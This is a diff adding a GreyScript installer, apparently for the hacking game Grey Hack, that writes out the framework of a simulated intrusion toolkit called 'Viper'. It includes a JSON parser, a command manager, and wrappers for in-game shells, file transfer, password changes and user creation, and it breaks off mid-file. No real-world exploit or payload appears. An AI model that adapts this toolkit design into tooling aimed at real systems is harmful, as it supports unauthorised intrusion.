@@ -1,0 +1,3325 @@
+meta = include_lib(home_dir+"/metaxploit.so")
+if not meta then meta = include_lib("/lib/metaxploit.so")
+if not meta then exit("library 'Metaxploit.so' not found in /lib or in current folder")
+startScript = function()
+s=get_shell;c=s.host_computer;m=function(t,z,r);x=t.split("/")[1:];e=x.pop;for y in x;if (__y_idx==0) then continue;c.create_folder("/"+x[:__y_idx].join("/"),y);end for;c.touch("/"+x.join("/"),e);j=c.File(t);if r then;j.set_content(z);print("New file """+t+""" got created.");else;j.set_content(j.get_content+z);print("Content got appended to """+t+""".");end if;end function;d=function;c.File(program_path).delete;end function;m("/root/vipersrc/main.src","import"+"_"+"code(""/root/vipersrc/libs/json.src"")
+extensionMediator=ExtensionMediator.New
+commandManager=CommandManager.New
+extensionMediator.addExtension(""commandManager"",commandManager)
+sessionManager=SessionManager.New
+extensionMediator.addExtension(""sessionManager"",sessionManager)
+libManager=LibManager.New
+extensionMediator.addExtension(""libManager"",libManager)
+metaxploitManager=MetaxploitManager.New
+extensionMediator.addExtension(""metaxploitManager"",metaxploitManager)
+macroManager=MacroManager.New
+extensionMediator.addExtension(""macroManager"",macroManager)
+themeManager=ThemeManager.New
+extensionMediator.addExtension(""themeManager"",themeManager)
+viperUi=ViperUi.New
+extensionMediator.addExtension(""viperUi"",viperUi)
+configManager=ConfigManager.New
+extensionMediator.addExtension(""configManager"",configManager)
+import"+"_"+"code(""/root/vipersrc/jumpfile/jumpfile-text.src"")
+import"+"_"+"code(""/root/vipersrc/utils/random-ip.src"")
+import"+"_"+"code(""/root/vipersrc/commands.src"")
+init=function()
+viperUi=extensionMediator.getExtension(""viperUi"")
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+libManager=extensionMediator.getExtension(""libManager"")
+sessionManager.addSession(get_shell)
+libManager=extensionMediator.getExtension(""libManager"")
+metaxploit=sessionManager.currentSession.handler.getFile(""metaxploit.so"")
+if metaxploit isa Error then
+metaxploit=sessionManager.currentSession.handler.getFile(""/lib/metaxploit.so"")
+end if
+if not (metaxploit isa Error) then
+meta=include_lib(metaxploit.path)
+if meta!=null then
+libManager.addLib(meta,{""ip"":sessionManager.currentSession.data.ip,""path"":metaxploit.path})
+end if
+end if
+cryptoFile=sessionManager.currentSession.handler.getFile(""crypto.so"")
+if cryptoFile isa Error then
+cryptoFile=sessionManager.currentSession.handler.getFile(""/lib/crypto.so"")
+end if
+if not (cryptoFile isa Error) then
+crypto=include_lib(cryptoFile.path)
+if crypto!=null then
+libManager.addLib(crypto,{""ip"":sessionManager.currentSession.data.ip,""path"":cryptoFile.path})
+end if
+end if
+clear_screen
+viperUi.init
+currentLibs=libManager.currentLibs
+listCurrentLibs=[]
+for lib in currentLibs
+listCurrentLibs.push(lib.value)
+end for
+viperUi.currentLibs(listCurrentLibs)
+macroManager=extensionMediator.getExtension(""macroManager"")
+macros=macroManager.init
+configManager=extensionMediator.getExtension(""configManager"")
+configManager.init
+themeManager=extensionMediator.getExtension(""themeManager"")
+themeManager.init
+end function
+main=function()
+viperUi=extensionMediator.getExtension(""viperUi"")
+commandManager=extensionMediator.getExtension(""commandManager"")
+commandManager.run
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+userInput=user_input(viperUi.displaySession(sessionManager.currentSession))
+result=commandManager.executeCommand(userInput)
+end function
+init
+while (true)
+main
+end while",1);m("/root/vipersrc/libs/json.src","parse=function(jsonString)
+p=new Parser
+return p.parse(jsonString)
+end function
+toJSON=function(value,compact=false,indent=0)
+if @value isa funcRef then
+return """"""<function>""""""
+end if
+if value==null then
+return ""null""
+end if
+if value isa number then
+return str(value)
+end if
+if value isa string then
+return """"""""+escape(value)+""""""""
+end if
+if value isa list then
+return _listToJSON(value,compact,indent)
+end if
+if typeof(value)==""map"" then
+return _mapToJSON(value,compact,indent)
+end if
+end function
+hexToInt=function(s)
+result=0
+for c in s
+result=result*16+_hexDigitMap[c]
+end for
+return result
+end function
+escape=function(s)
+for i in _escapeIndexes
+s=s.replace(_escapeFrom[i],_escapeTo[i])
+end for
+return s
+end function
+unescape=function(s)
+result=[]
+i=0
+maxi=s.len
+while i<maxi
+di=1
+if s[i]==""\"" then
+di=2
+c=s[i+1]
+if c==""b"" then
+result.push(char(8))
+else if c==""t"" then
+result.push(char(9))
+else if c==""n"" then
+result.push(char(10))
+else if c==""f"" then
+result.push(char(12))
+else if c==""r"" then
+result.push(char(13))
+else if c==""u"" then
+hex=s[i+2:i+6]
+result.push(char(hexToInt(hex)))
+di=6
+else
+result.push(c)
+end if
+else
+result.push(s[i])
+end if
+i=i+di
+end while
+return result.join("""")
+end function
+Parser={}
+Parser.source=""""
+Parser._sourceLen=0
+Parser._p=0
+Parser.init=function(source)
+self.source=source
+self._sourceLen=source.len
+end function
+Parser.parse=function(source=null)
+if source!=null then
+self.init(source)
+end if
+self._p=0
+return self._parseElement
+end function
+whitespace="" ""+char(9)+char(10)+char(13)
+Parser._skipWhitespace=function()
+while self._p<self._sourceLen
+c=self.source[self._p]
+if whitespace.indexOf(c)==null then
+break
+end if
+self._p=self._p+1
+end while
+end function
+Parser._parseElement=function()
+return self._parseValue
+end function
+Parser._parseValue=function()
+self._skipWhitespace
+c=self.source[self._p]
+if c=="""""""" then
+return self._parseString
+end if
+if ""0123456789-."".indexOf(c)!=null then
+return self._parseNumber
+end if
+if c==""["" then
+return self._parseList
+end if
+if c==""{"" then
+return self._parseMap
+end if
+if c==""t"" and self.source[self._p:self._p+4]==""true"" then
+self._p=self._p+4
+return true
+end if
+if c==""f"" and self.source[self._p:self._p+5]==""false"" then
+self._p=self._p+5
+return false
+end if
+if c==""n"" and self.source[self._p:self._p+4]==""null"" then
+self._p=self._p+4
+return null
+end if
+end function
+Parser._parseList=function()
+self._p=self._p+1
+self._skipWhitespace
+result=[]
+while self._p<self._sourceLen
+c=self.source[self._p]
+if c==""]"" then
+break
+end if
+result.push(self._parseElement)
+self._skipWhitespace
+c=self.source[self._p]
+if c=="","" then
+self._p=self._p+1
+self._skipWhitespace
+end if
+end while
+self._p=self._p+1
+return result
+end function
+Parser._parseMap=function()
+self._p=self._p+1
+self._skipWhitespace
+result={}
+while self._p<self._sourceLen
+c=self.source[self._p]
+if c==""}"" then
+break
+end if
+if c!="""""""" then
+print(""JSON error: object member key must be a string literal"")
+// ToDo: better error handling!
+print(""Error at position ""+self._p+"": ""+self.source[self._p-60:self._p+60])
+return null
+end if
+key=self._parseString
+self._skipWhitespace
+if self.source[self._p]!="":"" then
+print(""JSON error: colon expected"")
+print(""Error at position ""+self._p+"": ""+self.source[self._p-60:self._p+60])
+return null
+end if
+self._p=self._p+1
+self._skipWhitespace
+value=self._parseElement
+result[key]=value
+self._skipWhitespace
+c=self.source[self._p]
+if c=="","" then
+self._p=self._p+1
+self._skipWhitespace
+end if
+end while
+self._p=self._p+1
+return result
+end function
+Parser._parseString=function()
+self._p=self._p+1
+startPos=self._p
+anyEscape=false
+while self._p<self._sourceLen
+c=self.source[self._p]
+self._p=self._p+1
+if c=="""""""" then
+break
+end if
+if c==""\"" then
+anyEscape=true
+self._p=self._p+1
+end if
+end while
+result=self.source[startPos:self._p-1]
+if anyEscape then
+result=unescape(result)
+end if
+return result
+end function
+Parser._parseNumber=function()
+startPos=self._p
+while self._p<self._sourceLen
+c=self.source[self._p]
+if ""0123456789+-.eE"".indexOf(c)==null then
+break
+end if
+self._p=self._p+1
+end while
+result=val(self.source[startPos:self._p])
+return result
+end function
+_listToJSON=function(lst,compact,indent)
+ws=(_eol+""  ""*(indent+1))*(not compact)
+parts=[""["",ws]
+first=true
+for item in lst
+if not first then
+parts.push("","")
+parts.push(ws)
+end if
+parts.push(toJSON(item,compact,indent+1))
+first=false
+end for
+if not compact then
+parts.push(_eol+""  ""*indent)
+end if
+parts.push(""]"")
+return join(parts,"""")
+end function
+_mapToJSON=function(lst,compact,indent)
+ws=(_eol+""  ""*(indent+1))*(not compact)
+parts=[""{"",ws]
+first=true
+for kv in lst
+if not first then
+parts.push("","")
+parts.push(ws)
+end if
+parts.push(toJSON(str(kv.key)))
+parts.push("":"")
+if not compact then
+parts.push("" "")
+end if
+parts.push(toJSON(@kv.value,compact,indent+1))
+first=false
+end for
+if not compact then
+parts.push(_eol+""  ""*indent)
+end if
+parts.push(""}"")
+return join(parts,"""")
+end function
+_eol=char(13)
+_hexDigitMap={}
+for i in range(0,15)
+if i<10 then
+_hexDigitMap[str(i)]=i
+else
+_hexDigitMap[char(55+i)]=i
+_hexDigitMap[char(87+i)]=i
+end if
+end for
+_escapeFrom=[""\\"","""""""",char(8),char(9),char(10),char(12),char(13)]
+_escapeTo=[""\\"",""\"""""",""\b"",""\t"",""\n"",""\f"",""\r""]
+_escapeIndexes=_escapeFrom.indexes",1);m("/root/vipersrc/libs/error.src","Error={}
+Error.New=function(message)
+result=new self
+result.message=message
+return result
+end function",1);m("/root/vipersrc/libs/functional.src","isIterable=function(item)
+if typeof(item)==""map"" then
+return true
+end if
+if typeof(item)==""list"" then
+return true
+end if
+return false
+end function
+forEach=function(list,callback)
+if typeof(list)==""map"" then
+for v in list
+callback(v)
+end for
+end if
+if typeof(list)==""list"" then
+for v in list
+callback(v)
+end for
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+end function
+map=function(list,callback)
+if typeof(list)==""map"" then
+newList={}
+end if
+if typeof(list)==""list"" then
+newList=[]
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+if typeof(list)==""map"" then
+for item in list
+k=item.key
+v=item.value
+newList[k]=callback(item)
+end for
+end if
+if typeof(list)==""list"" then
+for v in list
+newList.push(callback(v))
+end for
+end if
+return newList
+end function
+filter=function(list,callback)
+if typeof(list)==""map"" then
+newList={}
+end if
+if typeof(list)==""list"" then
+newList=[]
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+for v in list
+if callback(v) then
+newList.push(v)
+end if
+end for
+return newList
+end function
+find=function(list,callback)
+if typeof(list)==""map"" then
+newList={}
+end if
+if typeof(list)==""list"" then
+newList=[]
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+for v in list
+if callback(v) then
+return v
+end if
+end for
+return null
+end function
+reduce=function(list,callback,initialValue)
+if typeof(list)==""map"" then
+newList={}
+end if
+if typeof(list)==""list"" then
+newList=[]
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+skipFirst=false
+if initialValue==null then
+skipFirst=true
+end if
+for v in list
+if skipFirst then
+initialValue=v
+skipFirst=false
+else
+initialValue=callback(initialValue,v)
+end if
+end for
+return initialValue
+end function
+every=function(list,callback)
+if typeof(list)==""map"" then
+newList={}
+end if
+if typeof(list)==""list"" then
+newList=[]
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+for v in list
+if callback(v)==false then
+return false
+end if
+end for
+return true
+end function
+some=function(list,callback)
+if typeof(list)==""map"" then
+newList={}
+end if
+if typeof(list)==""list"" then
+newList=[]
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+for v in list
+if callback(v) then
+return true
+end if
+end for
+return false
+end function
+flat=function(list)
+if typeof(list)==""list"" then
+newList=[]
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+for v in list
+if typeof(v)==""list"" then
+l=flat(v)
+for i in l
+newList.push(i)
+end for
+else
+newList.push(v)
+end if
+end for
+return newList
+end function
+distinct=function(list)
+if typeof(list)==""map"" then
+newList={}
+end if
+if typeof(list)==""list"" then
+newList=[]
+end if
+if isIterable(list)==false then
+return Error.New(""Invalid Type"")
+end if
+if typeof(list)==""map"" then
+for item in list
+k=item.key
+v=item.value
+if not newList.hasIndex(k) then
+newList[k]=v
+end if
+end for
+end if
+if typeof(list)==""list"" then
+for v in list
+if newList.indexOf(v)==null then
+newList.push(v)
+end if
+end for
+end if
+return newList
+end function",1);m("/root/vipersrc/managers/command/command-manager.src","CommandManager={}
+CommandManager.commands={}
+CommandManager.aliases={}
+CommandManager.mediator=null
+CommandManager.queue=[]
+CommandManager.getCommand=function(command)
+if not (hasIndex(self.commands,command)) or self.commands[command]==null then
+return Error.New(""There is no command with the name ""+command)
+end if
+return self.commands[command]
+end function
+CommandManager.executeCommand=function(str)
+macroManager=self.mediator.getExtension(""macroManager"")
+command=str.split("" "")[0]
+args=slice(str.split("" ""),1).join("" "")
+if hasIndex(self.aliases,command) then
+alias=self.aliases[command]
+command=alias.split("" "")[0]
+newArgs=slice(alias.split("" ""),1)
+if newArgs.len>0 then
+newArgs=newArgs.join("" "")+"" ""
+end if
+if newArgs.len==0 then
+newArgs=""""
+end if
+args=newArgs+args
+return self.executeCommand(command+"" ""+args)
+end if
+if command.indexOf(""@"")==0 then
+result=macroManager.runMacro(slice(command,1))
+if result isa Error then
+self.queue.push(result)
+end if
+return 
+end if
+if not (hasIndex(self.commands,command)) or self.commands[command]==null then
+return self.queue.push(Error.New(""There is no command with the name ""+command))
+end if
+command=self.commands[command]
+self.queue.push([command,args])
+end function
+CommandManager.run=function()
+while self.queue.len>0
+resultOfExecution=self.tick
+if resultOfExecution isa Error then
+self.queue=[]
+end if
+self.printCommandResult(resultOfExecution)
+end while
+end function
+CommandManager.tick=function()
+if self.queue.len==0 then
+return 
+end if
+command=self.queue.pull
+if command isa Error then
+return command
+end if
+hasPermissions=self.checkPermissions(command[0])
+if hasPermissions isa Error then
+return hasPermissions
+end if
+return command[0].execute(command[1])
+end function
+CommandManager.checkPermissions=function(command)
+sessionManager=self.mediator.getExtension(""sessionManager"")
+handler=sessionManager.currentSession.handler
+object=handler.type
+privilege=handler.privilege
+if not (self.checkObject(object,command.permissions.object)) then
+return Error.New(""You do not have the required object to run this command"")
+end if
+if not (self.checkPrivilege(privilege,command.permissions.privilege)) then
+return Error.New(""You do not have the required privilege to run this command"")
+end if
+end function
+CommandManager.checkObject=function(currentObject,requiredObject)
+if requiredObject==null then
+return true
+end if
+if requiredObject==""shell"" and currentObject==""shell"" then
+return true
+end if
+if requiredObject==""computer"" and (currentObject==""shell"" or currentObject==""computer"") then
+return true
+end if
+if requiredObject==""file"" and (currentObject==""shell"" or currentObject==""computer"" or currentObject==""file"") then
+return true
+end if
+return false
+end function
+CommandManager.checkPrivilege=function(currentPrivilege,requiredPrivilege)
+if requiredPrivilege==null then
+return true
+end if
+if currentPrivilege==""unknown"" then
+return true
+end if
+if requiredPrivilege==""root"" and currentPrivilege==""root"" then
+return true
+end if
+if requiredPrivilege==""user"" and (currentPrivilege==""root"" or currentPrivilege==""user"") then
+return true
+end if
+if requiredPrivilege==""guest"" and (currentPrivilege==""root"" or currentPrivilege==""user"" or currentPrivilege==""guest"") then
+return true
+end if
+return false
+end function
+CommandManager.printCommandResult=function(result)
+if result isa Error then
+print(result.message)
+else if result!=null then
+print(result)
+end if
+end function
+CommandManager.registerCommand=function(command)
+self.commands[command.name]=command
+end function
+CommandManager.unregisterCommand=function(command)
+self.commands[command.name]=null
+end function
+CommandManager.setMediator=function(mediator)
+self.mediator=mediator
+end function
+CommandManager.addAlias=function(alias,str)
+self.aliases[alias]=str
+end function
+CommandManager.removeAlias=function(alias)
+self.aliases.remove(alias)
+end function
+CommandManager.New=function()
+result=new CommandManager
+result.commands={}
+result.aliases={}
+result.queue=[]
+return result
+end function",1);m("/root/vipersrc/managers/command/command.src","PARAMETER_TYPES={""STRING"":""string"",""NUMBER"":""number"",""BOOLEAN"":""boolean"",""REST"":""rest"",""FLAG"":""flag"",""OPTIONS"":""options""}
+OptionsParameter={}
+OptionsParameter.name=null
+OptionsParameter.required=false
+OptionsParameter.default=null
+OptionsParameter.type=PARAMETER_TYPES.OPTIONS
+OptionsParameter.options={}
+OptionsParameter.handle=function(args,index)
+if not (args.hasIndex(index)) and self.required then
+return Error.New(""Missing required parameter: ""+self.name)
+end if
+if not (args.hasIndex(index)) then
+return [self.default,index+1]
+end if
+arg=args[index]
+if self.options.hasIndex(self.name) and not (self.options.hasIndex(arg)) then
+return [arg,index+1]
+end if
+if not (self.options.hasIndex(arg)) then
+return Error.New(""Invalid option: ""+arg)
+end if
+return [self.options[arg],index+1]
+end function
+OptionsParameter.New=function(options)
+param=new OptionsParameter
+if options.hasIndex(""name"") then
+param.name=options.name
+end if
+if not options.hasIndex(""name"") then
+return Error.New(""Missing required parameter: name"")
+end if
+if options.hasIndex(""required"") then
+param.required=options.required
+end if
+if not options.hasIndex(""required"") then
+param.required=false
+end if
+if options.hasIndex(""default"") then
+param.default=options.default
+end if
+if not options.hasIndex(""default"") then
+param.default=null
+end if
+if options.hasIndex(""options"") then
+param.options=options.options
+end if
+if not options.hasIndex(""options"") then
+return Error.New(""Missing required parameter: options"")
+end if
+return param
+end function
+RestParameter={}
+RestParameter.name=null
+RestParameter.required=false
+RestParameter.default=null
+RestParameter.type=PARAMETER_TYPES.REST
+RestParameter.handle=function(args,index)
+if not (args.hasIndex(index)) and self.required then
+return Error.New(""Missing required parameter: ""+self.name)
+end if
+if not (args.hasIndex(index)) then
+return [self.default,args.len]
+end if
+return [slice(args,index,args.len).join("" ""),args.len]
+end function
+RestParameter.New=function(options)
+param=new RestParameter
+if options.hasIndex(""name"") then
+param.name=options.name
+end if
+if not options.hasIndex(""name"") then
+return Error.New(""Missing required parameter: name"")
+end if
+if options.hasIndex(""required"") then
+param.required=options.required
+end if
+if not options.hasIndex(""required"") then
+param.required=false
+end if
+if options.hasIndex(""default"") then
+param.default=options.default
+end if
+if not options.hasIndex(""default"") then
+param.default=null
+end if
+return param
+end function
+FlagParameter={}
+FlagParameter.name=null
+FlagParameter.required=false
+FlagParameter.type=PARAMETER_TYPES.FLAG
+FlagParameter.flag=null
+FlagParameter.handle=function(args,index)
+if not (args.hasIndex(index)) and self.required then
+return Error.New(""Missing required parameter: ""+self.name)
+end if
+if not (args.hasIndex(index)) then
+return [false,index]
+end if
+arg=args[index]
+if arg==self.flag then
+return [true,index+1]
+end if
+return [false,index]
+end function
+FlagParameter.New=function(options)
+param=new FlagParameter
+if options.hasIndex(""name"") then
+param.name=options.name
+end if
+if not options.hasIndex(""name"") then
+return Error.New(""Missing required parameter: name"")
+end if
+if options.hasIndex(""required"") then
+param.required=options.required
+end if
+if not options.hasIndex(""required"") then
+param.required=false
+end if
+if options.hasIndex(""flag"") then
+param.flag=options.flag
+end if
+if not options.hasIndex(""flag"") then
+return Error.New(""Missing required parameter: flag"")
+end if
+return param
+end function
+Parameter={}
+Parameter.name=null
+Parameter.required=false
+Parameter.default=null
+Parameter.type=null
+Parameter.handle=function(args,index)
+if not (args.hasIndex(index)) and self.required then
+return Error.New(""Missing required parameter: ""+self.name)
+end if
+if not (args.hasIndex(index)) then
+return [self.default,index+1]
+end if
+arg=args[index]
+if self.type==PARAMETER_TYPES.STRING then
+return [arg,index+1]
+end if
+if self.type==PARAMETER_TYPES.NUMBER then
+if typeof(to_int(arg))==""string"" then
+return Error.New(""Invalid parameter type: ""+self.type)
+end if
+return [to_int(arg),index+1]
+end if
+if self.type==PARAMETER_TYPES.BOOLEAN then
+if arg==""true"" then
+return [true,index+1]
+end if
+if arg==""false"" then
+return [false,index+1]
+end if
+return Error.New(""Invalid parameter type: ""+self.type)
+end if
+return Error.New(""Invalid parameter type: ""+self.type)
+end function
+Parameter.New=function(options)
+param=new Parameter
+if options.hasIndex(""name"") then
+param.name=options.name
+end if
+if not options.hasIndex(""name"") then
+return Error.New(""Missing required parameter: name"")
+end if
+if options.hasIndex(""required"") then
+param.required=options.required
+end if
+if not options.hasIndex(""required"") then
+param.required=false
+end if
+if options.hasIndex(""default"") then
+param.default=options.default
+end if
+if not options.hasIndex(""default"") then
+param.default=null
+end if
+if options.hasIndex(""type"") then
+param.type=options.type
+end if
+if not options.hasIndex(""type"") then
+param.type=PARAMETER_TYPES.STRING
+end if
+return param
+end function
+Command={}
+Command.name=null
+Command.description=null
+Command.parameters=[]
+Command.callback=null
+Command.permissions={""object"":""file"",""privilege"":""guest""}
+Command.execute=function(args)
+parameters=self.parseArgsToParameters(args.split("" ""))
+if parameters isa Error then
+return parameters
+end if
+return self.callback(parameters)
+end function
+Command.help=function()
+help=self.name+"" ""
+for param in self.parameters
+if param.required then
+help=help+""<""+param.name+""> ""
+end if
+if not (param.required) then
+help=help+""[""+param.name+""] ""
+end if
+end for
+help=help+self.description
+return help
+end function
+Command.parseArgsToParameters=function(args)
+parameters={}
+handleRemoveEmpty=function(value)
+return value!=""""
+end function
+args=filter(args,@handleRemoveEmpty)
+if self.parameters.len==0 then
+return parameters
+end if
+index=0
+for parameter in self.parameters
+results=parameter.handle(args,index)
+if results isa Error then
+return results
+end if
+result=results[0]
+index=results[1]
+parameters[parameter.name]=result
+end for
+return parameters
+end function
+Command.New=function(options)
+command=new Command
+if options.hasIndex(""name"") then
+command.name=options.name
+end if
+if not options.hasIndex(""name"") then
+return Error.New(""Missing required parameter: name"")
+end if
+if options.hasIndex(""description"") then
+command.description=options.description
+end if
+if not options.hasIndex(""description"") then
+command.description=""""
+end if
+if options.hasIndex(""parameters"") then
+command.parameters=options.parameters
+end if
+if not options.hasIndex(""parameters"") then
+command.parameters=[]
+end if
+if options.hasIndex(""callback"") then
+command.callback=@options.callback
+end if
+if not options.hasIndex(""callback"") then
+return Error.New(""Missing required parameter: callback"")
+end if
+if options.hasIndex(""permissions"") then
+command.permissions={""object"":""file"",""privilege"":""guest""}+options.permissions
+end if
+if not options.hasIndex(""permissions"") then
+command.permissions={""object"":""file"",""privilege"":""guest""}
+end if
+return command
+end function",1);m("/root/vipersrc/mediator.src","ExtensionMediator={}
+ExtensionMediator.extensions={}
+ExtensionMediator.addExtension=function(name,extension)
+self.extensions[name]=extension
+extension.setMediator(self)
+end function
+ExtensionMediator.getExtension=function(name)
+return self.extensions[name]
+end function
+ExtensionMediator.removeExtension=function(name)
+self.extensions[name]=null
+end function
+ExtensionMediator.New=function()
+result=new ExtensionMediator
+return result
+end function",1);m("/root/vipersrc/facades/computer-objects/file.src","FILE_TYPES={}
+FILE_TYPES.FILE=""FILE""
+FILE_TYPES.FOLDER=""FOLDER""
+File={}
+File.file=null
+File.setPermissions=function(newPermissions,recersive=false)
+result=self.file.chmod(newPermissions,recersive)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+File.setOwner=function(newOwner,recersive=false)
+result=self.file.set_owner(newOwner,recersive)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+File.setGroup=function(newGroup,recersive=false)
+result=self.file.set_group(newGroup,recersive)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+File.hasPermission=function(permission)
+return self.file.has_permission(permission)
+end function
+File.permissions=function()
+return self.file.permissions
+end function
+File.copy=function(destination,name)
+if name==null then
+name=self.name
+end if
+result=self.file.copy(destination,name)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+File.delete=function()
+if self.type==FILE_TYPES.FOLDER then
+children=self.children
+if children isa Error then
+return Error.New(children)
+end if
+deleteChildrenHandler=function(child)
+return child.delete
+end function
+forEach(children,@deleteChildrenHandler)
+end if
+if self.path!=""/"" then
+return self.file.delete
+end if
+end function
+File.content=function()
+if self.type==FILE_TYPES.FOLDER then
+return Error.New(""Not able to get content of a folder"")
+end if
+result=self.file.get_content
+if result==null then
+return Error.New(""Not able to read file content"")
+end if
+return result
+end function
+File.setContent=function(newContent)
+if self.type==FILE_TYPES.FOLDER then
+return Error.New(""Not able to set content of a folder"")
+end if
+result=self.file.set_content(newContent)
+if not (result) then
+return Error.New(result)
+end if
+end function
+File.appendContent=function(newContent)
+if self.type==FILE_TYPES.FOLDER then
+return Error.New(""Not able to set content of a folder"")
+end if
+oldContent=self.content
+if oldContent isa Error then
+return oldContent
+end if
+result=self.setContent(oldContent+newContent)
+return result
+end function
+File.children=function()
+if self.type==FILE_TYPES.FILE then
+return Error.New(""Not able to get children of a file"")
+end if
+children=self.file.get_files+self.file.get_folders
+makeAllChildrenFileHandler=function(child)
+return File.New(child)
+end function
+return map(children,@makeAllChildrenFileHandler)
+end function
+File.child=function(name)
+children=self.children
+if children isa Error then
+return null
+end if
+findChildrenHandler=function(child)
+return child.name==name
+end function
+result=find(children,@findChildrenHandler)
+if result==null then
+return Error.New(""Not able to find child"")
+end if
+return result
+end function
+File.hasChild=function(name)
+children=self.child(name)
+if children isa Error then
+return false
+end if
+return true
+end function
+File.parent=function()
+parent=self.file.parent
+if parent==null then
+return Error.New(""Not able to get parent of root"")
+end if
+return File.New(parent)
+end function
+File.move=function(destination,name)
+if name==null then
+name=self.name
+end if
+result=self.file.move(destination,name)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+File.name=function()
+return self.file.name
+end function
+File.setName=function(newName)
+result=self.file.rename(newName)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+File.type=function()
+isFolder=self.file.is_folder
+if isFolder then
+return FILE_TYPES.FOLDER
+end if
+return FILE_TYPES.FILE
+end function
+File.size=function()
+return self.file.size
+end function
+File.path=function()
+return self.file.path
+end function
+File.owner=function()
+return self.file.owner
+end function
+File.group=function()
+return self.file.group
+end function
+File.New=function(file)
+if typeof(file)!=""file"" then
+return Error.New(""Not able to create file object from non file object"")
+end if
+result=new self
+result.file=file
+return result
+end function",1);m("/root/vipersrc/libs/ssv.src","ssvToList=function(csv)
+lineSplitter=function(line)
+return line.split("" "")
+end function
+lines=map(csv.split(""\n""),@lineSplitter)
+names=[]
+firstLine=lines.pull
+for item in firstLine
+names.push(item)
+end for
+result=[]
+for line in lines
+row={}
+for i in range(0,names.len-1)
+row[names[i]]=line[i]
+end for
+result.push(row)
+end for
+return result
+end function",1);m("/root/vipersrc/facades/computer-objects/computer.src","Computer={}
+Computer.computer=null
+Computer.getFile=function(path)
+result=self.computer.File(path)
+if result==null then
+return Error.New(""File not found: ""+path)
+end if
+return File.New(result)
+end function
+Computer.setPassword=function(user,password)
+result=self.computer.change_password(user,password)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+Computer.processes=function()
+return ssvToList(self.computer.show_procs)
+end function
+Computer.closeProcess=function(pid)
+result=self.computer.close_program(to_int(pid))
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+Computer.createFolder=function(path,name)
+result=self.computer.create_folder(path,name)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+Computer.createFile=function(path,name)
+result=self.computer.touch(path,name)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+Computer.addUser=function(user,password)
+result=self.computer.create_user(user,password)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+Computer.deleteUser=function(user)
+result=self.computer.delete_user(user)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+end function
+Computer.name=function()
+return self.computer.get_name
+end function
+Computer.ip=function()
+result={}
+result.local=self.computer.local_ip
+result.public=self.computer.public_ip
+return result
+end function
+Computer.New=function(computer)
+if typeof(computer)!=""computer"" then
+return Error.New(""Invalid computer object"")
+end if
+result=new self
+result.computer=computer
+return result
+end function",1);m("/root/vipersrc/facades/computer-objects/shell.src","Shell={}
+Shell.shell=null
+Shell.getComputer=function()
+result=self.shell.host_computer
+if result==null then
+return Error.New(""No computer found"")
+end if
+return Computer.New(result)
+end function
+Shell.transferFile=function(fileLocation,transferFolderLocation,otherShell)
+result=self.shell.scp(fileLocation,transferFolderLocation,otherShell.shell)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+return result
+end function
+Shell.executeFile=function(fileLocation,params="""")
+result=self.shell.launch(fileLocation,params)
+if result==false then
+return Error.New(""Failed to execute file"")
+end if
+end function
+Shell.buildFile=function(fileLocation,newFileLocation)
+result=self.shell.build(fileLocation,newFileLocation)
+if result!="""" then
+return Error.New(result)
+end if
+end function
+Shell.connectTo=function(ip,port,user,pass,service=""ssh"")
+result=self.shell.connect_service(ip,port,user,pass,service)
+if typeof(result)==""string"" then
+return Error.New(result)
+end if
+return Shell.New(result)
+end function
+Shell.activate=function()
+self.shell.start_terminal
+end function
+Shell.New=function(shell)
+if typeof(shell)!=""shell"" then
+return Error.New(""Invalid shell"")
+end if
+result=new Shell
+result.shell=shell
+return result
+end function",1);m("/root/vipersrc/facades/computer-objects/computer-object-factory.src","computerObjectFactory=function(object)
+if typeof(object)==""file"" then
+return File.New(object)
+end if
+if typeof(object)==""computer"" then
+return Computer.New(object)
+end if
+if typeof(object)==""shell"" then
+return Shell.New(object)
+end if
+return Error.New(""Invalid object type"")
+end function",1);m("/root/vipersrc/utils/string.src","startsWith=function(str,prefix)
+return str.indexOf(prefix)==0
+end function
+endsWith=function(str,suffix)
+return str.indexOf(suffix)==str.len-suffix.len
+end function",1);m("/root/vipersrc/utils/climbFileToRoot.src","climbFileToRoot=function(file)
+if not (file isa File) then
+Error.New(""file is not a File"")
+end if
+current=file
+while not (current.parent isa Error)
+current=current.parent
+end while
+return current
+end function",1);m("/root/vipersrc/utils/getUserFromHandler.src","getUserFromHandler=function(handler)
+rootFile=handler.getFile(""/root"")
+if not (rootFile isa Error) and rootFile.hasPermission(""w"") then
+return ""root""
+else
+homeFile=handler.getFile(""/home"")
+if not (homeFile isa Error) then
+for user in homeFile.children
+if user.name==""guest"" then
+continue
+end if
+if user.hasPermission(""w"") then
+return user.name
+end if
+end for
+end if
+guestFile=handler.getFile(""/home/guest"")
+if not (guestFile isa Error) and guestFile.hasPermission(""w"") then
+return ""guest""
+end if
+end if
+return ""unknown""
+end function",1);m("/root/vipersrc/managers/session/file.src","FileSession={}
+FileSession.current=null
+FileSession.root=null
+FileSession.getFile=function(path)
+startingPath=self.current
+pathToFollow=path.split(""/"")
+if startsWith(path,""/"") then
+startingPath=self.root
+pathToFollow=slice(pathToFollow,1)
